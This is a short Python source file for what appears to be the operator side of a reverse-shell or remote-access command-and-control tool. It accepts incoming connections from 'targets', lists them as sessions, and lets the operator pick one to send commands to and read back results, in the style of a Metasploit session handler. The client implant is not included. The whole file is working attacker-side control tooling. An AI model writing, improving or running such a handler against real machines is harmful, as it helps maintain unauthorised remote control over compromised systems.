import socket
import sys
import threading
from prettytable import PrettyTable

def conn_handler():
    while True:
        if kill_flag==1:
            break
        try:
            conn, addr = sock.accept()
            print("Connected with ", addr[0])
            a.append([conn,addr[0]])
        except:
            pass

def target_conn(target_id):
    while True:
        try:
            msg = input('Message to send to client : ')
            conn_out(target_id, msg)
            if msg == "exit":
                print("closing the connection")
                target_id.close()
                break
            elif msg == 'background':
                break
            res = conn_in(target_id)
            if res == 'exit':
                print('client closed connection')
                target_id.close()
                break
            print('response from client : ', res)
        except KeyboardInterrupt:
            print('\n keyboard interrupt issued')
            msg = "exit"
            conn_out(target_id, msg)
            target_id.close()
            break
        except Exception:
            target_id.close()
            break

def conn_in(conn):
    print('waiting for response')
    res = conn.recv(1024).decode()
    return res
def conn_out(conn, msg):
    conn.send(msg.encode())
def listner_handler():
    sock.bind((host_ip, host_port))
    print('listening for connection')
    sock.listen()
    t1 = threading.Thread(target=conn_handler)
    t1.start()

if __name__=='__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a = []
    kill_flag=0
    try:
        host_ip=sys.argv[1]
        host_port=int(sys.argv[2])
    except IndexError:
        print("\n Missing arguments")
    except Exception as e:
        print("\n")
        print(e)
    listner_handler()
    while True:
        try:
           if not a:
               continue
           else:
            command = input("Enter Command : ")
            if command.split(" ")[0].lower() == "sessions":
                session_counter=0
                if command.split(" ")[1] == "-l":
                    table=PrettyTable()
                    table.field_names = ['Session_id', 'Target_ip']
                    table.padding_width = 3
                    for target in a:
                            table.add_row([str(session_counter),target[1]])
                            session_counter += 1
                    print(table)
                if command.split(" ")[1] == "-i":
                    num = int(command.split(" ")[2])
                    target_id = a[num][0]
                    target_conn(target_id)
        except KeyboardInterrupt:
            print("\n Keyboard interrupt issued")
            kill_flag=1
            break
    sock.close()

                   







    